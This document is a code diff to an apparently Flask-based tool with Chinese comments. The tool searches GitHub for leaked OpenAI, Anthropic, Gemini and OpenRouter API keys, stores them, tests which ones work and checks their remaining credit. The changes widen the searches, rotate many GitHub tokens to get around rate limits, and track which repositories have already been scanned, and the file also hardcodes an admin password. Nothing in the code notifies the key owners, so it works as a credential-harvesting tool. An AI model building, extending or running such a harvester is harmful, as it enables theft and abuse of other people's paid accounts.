@@ -10,6 +10,8 @@ Changelog:
 from flask import Flask, render_template, jsonify, request, session
 from flask_cors import CORS
 from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
 
 __version__ = '1.1.0'
 
@@ -26,6 +28,7 @@ ADMIN_PASSWORD = 'Kuns123456.'
 import sqlite3, os, json, threading, time, re, requests, random
 from urllib import request as urlreq, error as urlerr
 DB_PATH = os.path.join(os.path.dirname(__file__), 'app.db')
+db_lock = threading.Lock()  # 数据库操作锁
 
 # --- Persistence layer ---
 def init_db():
@@ -52,53 +55,120 @@ def init_db():
 init_db()
 
 # ---- Default scan queries - 重新分配比例: OpenRouter 40%, Gemini 40%, OpenAI 10%, Claude 10% ----
+# 基础查询模板
+BASE_QUERIES = [
+    # API Key 前缀
+    'AIza', 'sk-or-v1-', 'sk-or-', 'sk-proj-', 'sk-ant-', 'sk-',
+    # 变量名
+    'GEMINI_API_KEY', 'OPENAI_API_KEY', 'ANTHROPIC_API_KEY', 'OPENROUTER_API_KEY',
+    'GOOGLE_API_KEY', 'CLAUDE_API_KEY', 'API_KEY', 'OPENAI_KEY'
+]
+
+# 文件类型
+FILE_TYPES = [
+    'filename:.env', 'filename:.env.local', 'filename:.env.production', 'filename:.env.staging',
+    'filename:.env.development', 'filename:.env.example', 'filename:config.env',
+    'extension:py', 'extension:js', 'extension:ts', 'extension:json', 'extension:yaml',
+    'extension:yml', 'extension:toml', 'extension:ini', 'extension:conf'
+]
+
+# 仓库特征（用于发现新仓库）
+REPO_FEATURES = [
+    'language:Python', 'language:JavaScript', 'language:TypeScript', 'language:Go',
+    'language:Rust', 'language:Java', 'language:PHP', 'language:Ruby',
+    'topic:ai', 'topic:ml', 'topic:api', 'topic:bot', 'topic:web', 'topic:app'
+]
+
+def generate_dynamic_queries(cycle_count):
+    """动态生成多样化的查询"""
+    import random
+
+    queries = []
+
+    # 1. 基础组合查询（高命中率）
+    for i in range(10):
+        key_pattern = random.choice(BASE_QUERIES)
+        file_type = random.choice(FILE_TYPES)
+        queries.append(f'"{key_pattern}" {file_type}')
+
+    # 2. 仓库特征查询（发现新仓库）
+    for i in range(5):
+        key_pattern = random.choice(BASE_QUERIES)
+        repo_feature = random.choice(REPO_FEATURES)
+        queries.append(f'"{key_pattern}" {repo_feature}')
+
+    # 3. 时间范围查询（获取2年内的内容）
+    from datetime import datetime, timedelta
+
+    # 计算720天前的日期
+    days_720_ago = (datetime.now() - timedelta(days=720)).strftime('%Y-%m-%d')
+    days_365_ago = (datetime.now() - timedelta(days=365)).strftime('%Y-%m-%d')
+    days_180_ago = (datetime.now() - timedelta(days=180)).strftime('%Y-%m-%d')
+
+    time_ranges = [
+        f'pushed:>{days_720_ago}',    # 2年内推送
+        f'created:>{days_720_ago}',   # 2年内创建
+        f'updated:>{days_365_ago}',   # 1年内更新
+        f'pushed:>{days_180_ago}',    # 6个月内推送
+    ]
+
+    for i in range(5):
+        key_pattern = random.choice(BASE_QUERIES)
+        time_range = random.choice(time_ranges)
+        queries.append(f'"{key_pattern}" {time_range}')
+
+    # 4. 组合查询（更精确，包含时间过滤）
+    for i in range(5):
+        key_pattern = random.choice(BASE_QUERIES)
+        file_type = random.choice(FILE_TYPES)
+
+        # 50%概率添加时间过滤
+        if random.random() < 0.5:
+            time_range = random.choice(time_ranges)
+            queries.append(f'"{key_pattern}" {file_type} {time_range}')
+        else:
+            repo_feature = random.choice(REPO_FEATURES)
+            queries.append(f'"{key_pattern}" {file_type} {repo_feature}')
+
+    logging.info(f"🎲 Generated {len(queries)} dynamic queries for cycle {cycle_count}")
+    return queries
+
+# 保留默认查询作为备用
 DEFAULT_QUERIES = [
-    # OpenRouter - 12个查询 (40%)
-    '"sk-or-v1-" extension:env -path:docs -path:doc -path:example -path:examples -path:samples -path:sample -path:test -path:tests -path:spec',
-    '"sk-or-" filename:.env -path:docs -path:example -path:examples -path:test -path:tests',
-    '"OPENROUTER_API_KEY" -path:docs -path:example -path:examples -path:test -path:tests',
-    'openrouter api key filename:config.* -path:docs -path:example -path:examples',
-    '"sk-or-" extension:js -path:docs -path:example -path:examples -path:test -path:tests',
-    '"sk-or-" extension:ts -path:docs -path:example -path:examples -path:test -path:tests',
-    '"sk-or-" extension:py -path:docs -path:example -path:examples -path:test -path:tests',
-    '"sk-or-" extension:json -path:docs -path:example -path:examples -path:test -path:tests -path:spec',
-    '"sk-or-" extension:yaml -path:docs -path:example -path:examples -path:test -path:tests',
-    '"sk-or-" extension:yml -path:docs -path:example -path:examples -path:test -path:tests',
-    'openrouter filename:config -path:docs -path:example -path:examples -path:test -path:tests',
-    '"sk-or-" extension:php -path:docs -path:example -path:examples -path:test -path:tests',
-
-    # Gemini / Google - 12个查询 (40%)
-    '"GEMINI_API_KEY" -path:docs -path:example -path:examples -path:test -path:tests',
-    '"GOOGLE_API_KEY" -path:docs -path:example -path:examples -path:test -path:tests',
-    'AIza filename:.env -path:docs -path:example -path:examples -path:test -path:tests',
-    'AIza extension:js -path:docs -path:example -path:examples -path:test -path:tests',
-    'AIza extension:py -path:docs -path:example -path:examples -path:test -path:tests',
-    'AIza extension:ts -path:docs -path:example -path:examples -path:test -path:tests',
-    'AIza extension:json -path:docs -path:example -path:examples -path:test -path:tests',
-    'AIza extension:yaml -path:docs -path:example -path:examples -path:test -path:tests',
-    '"GOOGLE_AI_KEY" -path:docs -path:example -path:examples -path:test -path:tests',
-    'google.api_key extension:py -path:docs -path:example -path:examples -path:test -path:tests',
-    'gemini filename:config -path:docs -path:example -path:examples -path:test -path:tests',
-    'generativeai extension:py -path:docs -path:example -path:examples -path:test -path:tests',
-
-    # OpenAI - 3个查询 (10%)
-    '"OPENAI_API_KEY" -path:docs -path:example -path:examples -path:test -path:tests',
-    'openai.api_key extension:py -path:docs -path:example -path:examples -path:test -path:tests',
-    '"sk-" filename:.env -path:docs -path:example -path:examples -path:test -path:tests',
-
-    # Anthropic/Claude - 3个查询 (10%)
-    '"ANTHROPIC_API_KEY" -path:docs -path:example -path:examples -path:test -path:tests',
-    '"sk-ant-" extension:env -path:docs -path:example -path:examples -path:test -path:tests',
-    '"sk-ant-" extension:py -path:docs -path:example -path:examples -path:test -path:tests',
+    'AIza filename:.env',
+    '"GEMINI_API_KEY" filename:.env',
+    '"GOOGLE_API_KEY" filename:.env',
+    'AIza extension:js',
+    'AIza extension:py',
+    '"OPENAI_API_KEY" filename:.env',
+    '"sk-proj-" extension:env',
+    '"sk-" filename:.env.production',
+    '"sk-" filename:.env.local',
+    'openai.api_key extension:py',
+    '"sk-" extension:js',
+    '"ANTHROPIC_API_KEY" filename:.env',
+    '"sk-ant-" extension:env',
+    '"sk-ant-" extension:py',
+    '"CLAUDE_API_KEY" filename:.env',
+    '"OPENROUTER_API_KEY" filename:.env',
+    '"sk-or-v1-" extension:env',
+    '"sk-or-" filename:.env',
+    'filename:.env',
+    'filename:.env.sample',
+    'filename:config.env',
+    'filename:.env.example',
+    'filename:.env.template',
+    'filename:.env.dist',
+    'filename:.env.backup'
 ]
 
 def ensure_defaults():
     if _get_setting('scan_queries', None) in (None, []):
         _set_setting('scan_queries', DEFAULT_QUERIES)
     if _get_setting('scan_interval', None) is None:
-        _set_setting('scan_interval', 60)
+        _set_setting('scan_interval', 120)  # 11个token保守配置：120秒间隔
     if _get_setting('max_results_per_query', None) is None:
-        _set_setting('max_results_per_query', 100)
+        _set_setting('max_results_per_query', 200)  # 11个token保守配置：每查询200个结果
     if _get_setting('prefer_recent', None) is None:
         _set_setting('prefer_recent', True)
     if _get_setting('recent_days', None) is None:
@@ -389,21 +459,23 @@ def _fetch_openrouter_credits(token: str) -> float:
         # 根据官方文档格式解析
         if isinstance(data, dict) and 'data' in data:
             key_data = data['data']
-            
-            # 计算剩余额度
+
+            # 获取额度信息
             limit = key_data.get('limit')  # 总额度，null表示无限
             usage = key_data.get('usage', 0)  # 已使用额度
-            
+
+            logging.debug(f"OpenRouter API response: limit={limit}, usage={usage}")
+
             if limit is None:
-                # 无限额度，返回一个大数值表示
-                return 999999.0
+                # 无限额度，返回负的使用量来表示（前端会特殊处理）
+                return -float(usage) if usage > 0 else -0.01
             elif limit > 0:
                 # 有限额度，返回剩余额度
                 remaining = max(0, limit - usage)
                 return float(remaining)
             else:
                 return 0.0
-        
+
         return 0.0
     except Exception as e:
         logging.debug(f"OpenRouter余额查询失败: {str(e)}")
@@ -433,14 +505,33 @@ threading.Thread(target=balance_loop, daemon=True).start()
 
 
 def validator_loop():
-    while True:
-        rows = pick_keys_for_validation(limit=50, stale_minutes=60)
-        if not rows:
-            time.sleep(10); continue
-        for kv, kt, _last in rows:
+    def validate_single_key(key_data):
+        kv, kt, _last = key_data
+        try:
             code = validate_key_once(kv, kt)
             _update_key_status(kv, code, kt)
-            time.sleep(0.2)  # gentle pace
+            return f"✅ {kt}: {code}"
+        except Exception as e:
+            logging.error(f"❌ Validation error for {kt}: {e}")
+            return f"❌ {kt}: error"
+
+    while True:
+        rows = pick_keys_for_validation(limit=100, stale_minutes=60)  # 增加批次大小
+        if not rows:
+            time.sleep(10); continue
+
+        # 4C8G服务器：使用2个线程并发验证
+        with ThreadPoolExecutor(max_workers=2) as executor:
+            futures = [executor.submit(validate_single_key, row) for row in rows]
+
+            for future in as_completed(futures):
+                try:
+                    result = future.result()
+                    # logging.debug(result)  # 可选：记录验证结果
+                except Exception as e:
+                    logging.error(f"❌ Validation thread error: {e}")
+
+        time.sleep(5)  # 批次间休息
 
 # 启动验证线程
 threading.Thread(target=validator_loop, daemon=True).start()
@@ -484,9 +575,19 @@ def _save_key(kv: str, kt: str):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
     try:
-        c.execute("INSERT OR IGNORE INTO keys (key_value, key_type, status, found_at, last_checked, balance) VALUES (?,?,?,?,?,?)",
-                  (kv, kt, None, now, None, 0))
-        conn.commit()
+        # 检查key是否已存在
+        c.execute("SELECT COUNT(*) FROM keys WHERE key_value = ?", (kv,))
+        exists = c.fetchone()[0] > 0
+
+        if exists:
+            logging.debug(f"🔄 Key already exists: {kv[:20]}...")
+            return False  # 返回False表示未新增
+        else:
+            c.execute("INSERT INTO keys (key_value, key_type, status, found_at, last_checked, balance) VALUES (?,?,?,?,?,?)",
+                      (kv, kt, None, now, None, 0))
+            conn.commit()
+            logging.debug(f"✅ New key saved: {kt} - {kv[:20]}...")
+            return True  # 返回True表示新增
     finally:
         conn.close()
 
@@ -555,57 +656,112 @@ def scanner_loop():
         def __init__(self, tokens):
             self.tokens = [t.strip() for t in tokens if t.strip()]
             self._token_ptr = 0
-        
+            self._rate_limited_tokens = set()  # 记录被限流的token
+            self._last_reset = time.time()
+
         def next_token(self):
             if not self.tokens:
                 return None
-            token = self.tokens[self._token_ptr % len(self.tokens)]
-            self._token_ptr += 1
-            return token.strip()
+
+            # 每小时重置限流记录
+            if time.time() - self._last_reset > 3600:
+                self._rate_limited_tokens.clear()
+                self._last_reset = time.time()
+                logging.info(f"🔄 Reset rate limit tracking, available tokens: {len(self.tokens)}")
+
+            # 找到可用的token
+            attempts = 0
+            while attempts < len(self.tokens):
+                token = self.tokens[self._token_ptr % len(self.tokens)]
+                self._token_ptr += 1
+                attempts += 1
+
+                if token not in self._rate_limited_tokens:
+                    return token.strip()
+
+            # 所有token都被限流，返回第一个（等待重置）
+            logging.warning(f"⚠️ All {len(self.tokens)} tokens are rate limited, using first token")
+            return self.tokens[0].strip() if self.tokens else None
+
+        def mark_rate_limited(self, token):
+            """标记token为限流状态"""
+            self._rate_limited_tokens.add(token)
+            available = len(self.tokens) - len(self._rate_limited_tokens)
+            logging.warning(f"🚫 Token marked as rate limited. Available: {available}/{len(self.tokens)}")
     
     class GitHubSearcher:
         def __init__(self, token_rotator):
             self.token_rotator = token_rotator
         
-        def search_for_keys(self, query, max_retries=5):
-            for attempt in range(1, max_retries + 1):
-                token = self.token_rotator.next_token()
-                if not token:
-                    return None
-                
-                headers = {
-                    "Accept": "application/vnd.github.v3+json",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                    "Authorization": f"token {token}"
-                }
-                
-                params = {"q": query, "per_page": 100, "page": 1}
-                
-                try:
-                    response = requests.get("https://api.github.com/search/code", headers=headers, params=params, timeout=30)
-                    
-                    if response.status_code == 200:
-                        result = response.json()
-                        items = result.get('items', [])
-                        logging.info(f"🔍 Search success: [{query[:40]}...] items={len(items)}")
-                        return result
-                    elif response.status_code in (403, 429):
-                        wait_time = min(2 ** attempt + random.uniform(0, 1), 60)
-                        if attempt < max_retries:
-                            logging.warning(f"⚠️ Rate limit (attempt {attempt}/{max_retries}) - waiting {wait_time:.1f}s")
-                            time.sleep(wait_time)
-                            continue
+        def search_for_keys(self, query, max_results=200, max_retries=2):
+            all_items = []
+            pages_to_scan = min(5, (max_results + 99) // 100)  # 增加到5页，获取更深入的结果
+
+            # 随机起始页，避免总是从第1页开始，扫描更深的页面
+            import random
+            start_page = random.randint(1, 10)  # 从1-10页随机开始
+
+            for page in range(start_page, start_page + pages_to_scan):
+                for attempt in range(1, max_retries + 1):
+                    token = self.token_rotator.next_token()
+                    if not token:
+                        return {"items": all_items, "total_count": len(all_items)}
+
+                    headers = {
+                        "Accept": "application/vnd.github.v3+json",
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                        "Authorization": f"token {token}"
+                    }
+
+                    params = {"q": query, "per_page": 100, "page": page}
+
+                    try:
+                        response = requests.get("https://api.github.com/search/code", headers=headers, params=params, timeout=30)
+
+                        if response.status_code == 200:
+                            result = response.json()
+                            items = result.get('items', [])
+                            all_items.extend(items)
+                            logging.info(f"🔍 Page {page}: [{query[:30]}...] +{len(items)} items (total: {len(all_items)})")
+
+                            # 如果这页没有满100个结果，说明没有更多页了
+                            if len(items) < 100:
+                                break
+
+                            # 成功获取这页，跳出重试循环
+                            break
+
+                        elif response.status_code in (403, 429):
+                            # 标记当前token为限流状态
+                            self.token_rotator.mark_rate_limited(token)
+
+                            # 11个token优化：动态等待时间
+                            base_wait = 5 + (attempt * 3)  # 5s, 8s, 11s
+                            wait_time = min(base_wait + random.uniform(0, 2), 30)
+
+                            if attempt < max_retries:
+                                logging.warning(f"⚠️ Rate limit page {page} (attempt {attempt}/{max_retries}) - waiting {wait_time:.1f}s")
+                                time.sleep(wait_time)
+                                continue
+                            else:
+                                # 达到重试上限，跳过这页继续下一页
+                                logging.warning(f"⚠️ Rate limit exceeded for page {page}, skipping to next page")
+                                break
                         else:
-                            return None
-                    else:
+                            if attempt < max_retries:
+                                time.sleep(2)
+                                continue
+                    except Exception as e:
                         if attempt < max_retries:
+                            logging.warning(f"⚠️ Error on page {page} attempt {attempt}: {e}")
                             time.sleep(2)
                             continue
-                except Exception as e:
-                    if attempt < max_retries:
-                        time.sleep(2)
-                        continue
-            return None
+                else:
+                    # 所有重试都失败了，跳过这页
+                    logging.error(f"❌ Failed to get page {page} after {max_retries} attempts")
+                    continue
+
+            return {"items": all_items, "total_count": len(all_items)}
         
         def get_file_content(self, item):
             repo = item["repository"]["full_name"]
@@ -621,17 +777,116 @@ def scanner_loop():
                     continue
             return None
     
-    # SHA去重和过滤逻辑
+    # 持久化文件去重系统
+    def init_scanned_files_table():
+        """初始化已扫描文件表"""
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        try:
+            c.execute('''CREATE TABLE IF NOT EXISTS scanned_files (
+                file_sha TEXT PRIMARY KEY,
+                repo_name TEXT,
+                file_path TEXT,
+                first_scanned TEXT,
+                last_scanned TEXT,
+                scan_count INTEGER DEFAULT 1
+            )''')
+
+            # 创建已扫描仓库表
+            c.execute('''CREATE TABLE IF NOT EXISTS scanned_repos (
+                repo_name TEXT PRIMARY KEY,
+                first_scanned TEXT,
+                last_scanned TEXT,
+                file_count INTEGER DEFAULT 0,
+                key_count INTEGER DEFAULT 0
+            )''')
+            conn.commit()
+        finally:
+            conn.close()
+
+    def is_file_already_scanned(sha, repo_name, file_path):
+        """检查文件是否已经被扫描过"""
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        try:
+            c.execute("SELECT scan_count FROM scanned_files WHERE file_sha = ?", (sha,))
+            result = c.fetchone()
+            if result:
+                # 更新扫描记录
+                c.execute("""UPDATE scanned_files
+                           SET last_scanned = ?, scan_count = scan_count + 1
+                           WHERE file_sha = ?""",
+                         (datetime.now().strftime('%Y-%m-%d %H:%M:%S'), sha))
+                conn.commit()
+                return True, result[0]
+            return False, 0
+        finally:
+            conn.close()
+
+    def mark_file_as_scanned(sha, repo_name, file_path):
+        """标记文件为已扫描"""
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        try:
+            now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            c.execute("""INSERT OR REPLACE INTO scanned_files
+                       (file_sha, repo_name, file_path, first_scanned, last_scanned, scan_count)
+                       VALUES (?, ?, ?, ?, ?, 1)""",
+                     (sha, repo_name, file_path, now, now))
+            conn.commit()
+        finally:
+            conn.close()
+
+    def is_repo_already_scanned(repo_name):
+        """检查仓库是否已经被扫描过"""
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        try:
+            c.execute("SELECT file_count, key_count FROM scanned_repos WHERE repo_name = ?", (repo_name,))
+            result = c.fetchone()
+            return result is not None, result if result else (0, 0)
+        finally:
+            conn.close()
+
+    def mark_repo_as_scanned(repo_name, file_count=0, key_count=0):
+        """标记仓库为已扫描"""
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        try:
+            now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            c.execute("""INSERT OR REPLACE INTO scanned_repos
+                       (repo_name, first_scanned, last_scanned, file_count, key_count)
+                       VALUES (?, ?, ?, ?, ?)""",
+                     (repo_name, now, now, file_count, key_count))
+            conn.commit()
+        finally:
+            conn.close()
+
+    # 初始化表
+    init_scanned_files_table()
+
+    # 临时SHA缓存（用于单个扫描周期内的去重）
     scanned_shas = set()
     blacklist = ['readme', 'docs/', 'doc/', 'example', 'sample', 'test', 'spec', 'demo']
     
     def should_skip_item(item):
-        # SHA去重
-        if item.get("sha") in scanned_shas:
-            return True, "sha_duplicate"
-        
-        # 文档过滤
-        path_lower = item["path"].lower()
+        sha = item.get("sha")
+        repo_name = item['repository']['full_name']
+        file_path = item['path']
+
+        # 1. 临时SHA缓存检查（单个扫描周期内）
+        if sha in scanned_shas:
+            logging.debug(f"⏭️ Skipping duplicate SHA in current cycle: {sha[:8]}... ({file_path})")
+            return True, "cycle_duplicate"
+
+        # 2. 持久化文件检查（跨扫描周期）
+        already_scanned, scan_count = is_file_already_scanned(sha, repo_name, file_path)
+        if already_scanned:
+            logging.debug(f"⏭️ Skipping already scanned file (#{scan_count}): {repo_name}/{file_path}")
+            return True, "already_scanned"
+
+        # 3. 文档过滤
+        path_lower = file_path.lower()
         if any(token in path_lower for token in blacklist):
             return True, "doc_filter"
         
@@ -674,12 +929,29 @@ def scanner_loop():
     
     # 主循环
     logging.info("🎪 EXAMPLE-BASED SCANNER STARTED")
-    
+
+    # 扫描周期计数器
+    cycle_count = 0
+
     while True:
         try:
+            cycle_count += 1
+
+            # 每个周期清空临时SHA缓存（但保持持久化记录）
+            scanned_shas.clear()
+            logging.info(f"🔄 Cycle {cycle_count}: Starting fresh scan (persistent file tracking active)")
+
             # 获取配置
             tokens = _get_setting('github_tokens', [])
-            queries = _get_setting('scan_queries', [])
+
+            # 使用动态查询生成，提高扫描效率
+            if cycle_count % 3 == 0:  # 每3个周期使用动态查询
+                queries = generate_dynamic_queries(cycle_count)
+                logging.info(f"🎲 Using dynamic queries for cycle {cycle_count}")
+            else:
+                queries = _get_setting('scan_queries', DEFAULT_QUERIES)
+                logging.info(f"📋 Using configured queries for cycle {cycle_count}")
+
             recent_days = int(_get_setting('recent_days', 365) or 365)
             
             if not tokens or not queries:
@@ -690,24 +962,60 @@ def scanner_loop():
             # 初始化组件
             token_rotator = TokenRotator(tokens)
             searcher = GitHubSearcher(token_rotator)
-            
+
             # 开始扫描
             scanner_status['is_running'] = True
             scanner_status['last_scan_start'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+            # 获取已扫描统计
+            conn = sqlite3.connect(DB_PATH)
+            c = conn.cursor()
+            c.execute("SELECT COUNT(*) FROM scanned_files")
+            total_scanned_files = c.fetchone()[0]
+            c.execute("SELECT COUNT(*) FROM scanned_repos")
+            total_scanned_repos = c.fetchone()[0]
+            conn.close()
+
+            logging.info(f"🚀 Scan cycle {cycle_count}: {len(queries)} queries, {len(tokens)} tokens, repos: {total_scanned_repos}, files: {total_scanned_files}")
             scanner_status['scanned_count'] = 0
             scanner_status['keys_found_session'] = 0
-            
-            logging.info(f"🚀 Scan cycle: {len(queries)} queries, {len(tokens)} tokens")
             
             # Example风格的查询处理
             for query_index, query in enumerate(queries, 1):
                 scanner_status['current_query'] = query[:50]
-                
-                # 不使用时间过滤器，直接搜索
-                logging.info(f"📊 Query {query_index}/{len(queries)}: {query}")
-                
+
+                # 添加多样化搜索策略
+                import random
+
+                # 随机排序
+                sort_options = ['indexed', 'updated', 'created']
+                random_sort = random.choice(sort_options)
+
+                # 随机时间范围（720天内，即2年内的仓库）
+                days_720_ago = (datetime.now() - timedelta(days=720)).strftime('%Y-%m-%d')
+                days_365_ago = (datetime.now() - timedelta(days=365)).strftime('%Y-%m-%d')
+                days_180_ago = (datetime.now() - timedelta(days=180)).strftime('%Y-%m-%d')
+
+                time_filters = [
+                    '',  # 无时间限制
+                    f'pushed:>{days_720_ago}',    # 2年内推送
+                    f'created:>{days_720_ago}',   # 2年内创建
+                    f'updated:>{days_365_ago}',   # 1年内更新
+                    f'pushed:>{days_180_ago}',    # 6个月内推送
+                ]
+                time_filter = random.choice(time_filters)
+
+                # 构建最终查询
+                if time_filter:
+                    final_query = f"{query} sort:{random_sort} {time_filter}"
+                else:
+                    final_query = f"{query} sort:{random_sort}"
+
+                logging.info(f"📊 Query {query_index}/{len(queries)}: {final_query}")
+
                 # Example的搜索逻辑
-                search_result = searcher.search_for_keys(query)
+                max_results = _get_setting('max_results_per_query', 1000)
+                search_result = searcher.search_for_keys(final_query, max_results)
                 if not search_result:
                     logging.warning(f"⚠️ Search failed: {query}")
                     continue
@@ -716,65 +1024,116 @@ def scanner_loop():
                 if not items:
                     logging.info(f"📭 No items: {query}")
                     continue
-                
+
                 query_scanned = 0
                 query_keys = 0
-                
-                # Example的item处理循环
-                for item_index, item in enumerate(items, 1):
-                    # 跳过检查
-                    should_skip, skip_reason = should_skip_item(item)
-                    if should_skip:
+                query_skipped = 0
+
+                # 仓库级别去重 - 按仓库分组处理
+                repos_in_query = {}
+                for item in items:
+                    repo_name = item["repository"]["full_name"]
+                    if repo_name not in repos_in_query:
+                        repos_in_query[repo_name] = []
+                    repos_in_query[repo_name].append(item)
+
+                logging.info(f"🏢 Found {len(repos_in_query)} unique repositories in this query")
+
+                # Example的仓库处理循环
+                for repo_name, repo_items in repos_in_query.items():
+                    # 检查仓库是否已经扫描过
+                    repo_already_scanned, (file_count, key_count) = is_repo_already_scanned(repo_name)
+                    if repo_already_scanned:
+                        logging.info(f"⏭️ Skipping already scanned repo: {repo_name} ({file_count} files, {key_count} keys)")
+                        query_skipped += len(repo_items)
                         continue
-                    
-                    # 添加到已扫描SHA
-                    scanned_shas.add(item.get("sha"))
-                    
-                    # 获取文件内容
-                    content = searcher.get_file_content(item)
-                    if not content:
-                        continue
-                    
-                    # 更新计数器
-                    query_scanned += 1
-                    scanner_status['scanned_count'] += 1
-                    
-                    # Example的密钥提取和过滤
-                    keys = extract_and_filter_keys(content)
-                    if keys:
-                        repo_name = item["repository"]["full_name"]
+
+                    logging.info(f"🔍 Scanning new repo: {repo_name} ({len(repo_items)} files)")
+                    repo_file_count = 0
+                    repo_key_count = 0
+
+                    # 处理仓库中的每个文件
+                    for item_index, item in enumerate(repo_items, 1):
+                        # 跳过检查
+                        should_skip, skip_reason = should_skip_item(item)
+                        if should_skip:
+                            query_skipped += 1
+                            continue
+
+                        # 添加到已扫描SHA（临时缓存）
+                        sha = item.get("sha")
                         file_path = item["path"]
-                        
-                        logging.info(f"🔑 Found {len(keys)} keys in {repo_name}/{file_path}")
-                        
-                        for key_type, key_value in keys:
-                            # 保存到数据库
-                            now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                            _save_key(key_value, key_type)
-                            
-                            # 验证密钥（简化版）
-                            try:
-                                validation_result = validate_key_once(key_value, key_type)
-                                _update_key_status(key_value, validation_result, key_type)
-                                
-                                if validation_result == 200:
-                                    query_keys += 1
-                                    scanner_status['keys_found_session'] += 1
-                                    logging.info(f"✅ Valid {key_type}: {key_value[:20]}...")
-                                elif validation_result == 429:
-                                    logging.warning(f"⚠️ Rate limited {key_type}: {key_value[:20]}...")
-                                else:
-                                    logging.info(f"❌ Invalid {key_type}: {key_value[:20]}...")
-                            except Exception as e:
-                                logging.error(f"Validation error: {str(e)[:30]}")
-                    
-                    # 平衡的延迟控制 - 既稳定又不太慢
-                    time.sleep(random.uniform(1.5, 3))
-                
-                logging.info(f"✅ Query {query_index} complete: scanned={query_scanned}, keys={query_keys}")
-                
-                # Query间适中延迟，平衡速度与稳定性
-                time.sleep(random.uniform(1, 2))
+                        scanned_shas.add(sha)
+
+                        # 标记文件为已扫描（持久化）
+                        mark_file_as_scanned(sha, repo_name, file_path)
+                        logging.debug(f"📝 Marked file as scanned: {repo_name}/{file_path}")
+
+                        # 获取文件内容
+                        content = searcher.get_file_content(item)
+                        if not content:
+                            continue
+
+                        # 更新计数器
+                        query_scanned += 1
+                        scanner_status['scanned_count'] += 1
+                        repo_file_count += 1
+
+                        # Example的密钥提取和过滤
+                        keys = extract_and_filter_keys(content)
+                        if keys:
+                            file_path = item["path"]
+
+                            logging.info(f"🔑 Found {len(keys)} keys in {repo_name}/{file_path}")
+
+                            new_keys_count = 0
+                            for key_type, key_value in keys:
+                                # 保存到数据库，检查是否为新key
+                                is_new = _save_key(key_value, key_type)
+
+                                if is_new:
+                                    new_keys_count += 1
+                                    repo_key_count += 1
+
+                                # 验证密钥（简化版）
+                                try:
+                                    validation_result = validate_key_once(key_value, key_type)
+                                    _update_key_status(key_value, validation_result, key_type)
+
+                                    if validation_result == 200:
+                                        query_keys += 1
+                                        scanner_status['keys_found_session'] += 1
+                                        logging.info(f"✅ Valid {key_type}: {key_value[:20]}...")
+                                    elif validation_result == 429:
+                                        logging.warning(f"⚠️ Rate limited {key_type}: {key_value[:20]}...")
+                                    else:
+                                        logging.info(f"❌ Invalid {key_type}: {key_value[:20]}...")
+                                except Exception as e:
+                                    logging.error(f"Validation error: {str(e)[:30]}")
+
+                        # 统计新key
+                        if new_keys_count > 0:
+                            logging.info(f"💾 Saved {new_keys_count} NEW keys (out of {len(keys)} found)")
+                        else:
+                            logging.info(f"🔄 All {len(keys)} keys were duplicates")
+
+                        # 平衡的延迟控制 - 既稳定又不太慢
+                        time.sleep(random.uniform(1.5, 3))
+
+                    # 标记仓库为已扫描
+                    mark_repo_as_scanned(repo_name, repo_file_count, repo_key_count)
+                    logging.info(f"✅ Repo {repo_name} complete: {repo_file_count} files, {repo_key_count} new keys")
+
+                logging.info(f"✅ Query {query_index} complete: scanned={query_scanned}, keys={query_keys}, skipped={query_skipped}, SHA_cache={len(scanned_shas)}")
+
+                # 如果这个查询的重复率太高，记录下来
+                if query_scanned > 0:
+                    duplicate_rate = query_skipped / query_scanned
+                    if duplicate_rate > 0.8:  # 80%以上都是重复的
+                        logging.warning(f"⚠️ High duplicate rate ({duplicate_rate:.1%}) for query: {final_query[:50]}...")
+
+                # 11个token保守配置：查询间延迟5-8秒，确保稳定
+                time.sleep(random.uniform(5, 8))
             
             # 扫描周期结束
             scanner_status['is_running'] = False
@@ -796,7 +1155,7 @@ def scanner_loop():
                 continue
             
             # 24*7运行模式 - 使用配置的扫描间隔
-            scan_interval = _get_setting('scan_interval', 120)  # 默认120秒
+            scan_interval = _get_setting('scan_interval', 15)  # 默认15秒
             logging.info(f"😴 Cycle complete. Next cycle in {scan_interval} seconds...")
             time.sleep(scan_interval)
             
@@ -1023,6 +1382,15 @@ def api_scanner_trigger():
     global manual_scan_requested
     manual_scan_requested = True
     return jsonify({'status': 'scan triggered'})
+
+@app.route('/api/refresh-openrouter-balance', methods=['POST'])
+def api_refresh_openrouter_balance():
+    """手动刷新OpenRouter余额"""
+    try:
+        refresh_openrouter_balance()
+        return jsonify({'success': True, 'message': 'OpenRouter余额已刷新'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/admin/login', methods=['POST'])
 def api_admin_login():
